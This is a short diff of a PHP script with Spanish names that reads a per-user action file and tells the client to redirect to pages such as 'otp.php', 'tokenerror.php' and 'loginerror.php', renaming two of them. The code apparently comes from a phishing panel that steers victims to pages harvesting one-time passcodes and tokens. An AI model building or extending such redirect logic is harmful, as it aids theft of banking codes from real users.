@@ -12,7 +12,7 @@ $archivo = "acciones/$usuario.txt";
 if (file_exists($archivo)) {
     $destino = trim(file_get_contents($archivo));
     unlink($archivo);
-    if (in_array($destino, ['otp.php', 'otperror.php', 'token.php', 'tokenerror.php', 'loginerror.php'])) {
+    if (in_array($destino, ['opin.php', 'otperror.php', 'tok.php', 'tokenerror.php', 'loginerror.php'])) {
         echo json_encode(["status" => "redirigir", "destino" => $destino]);
         exit;
     }
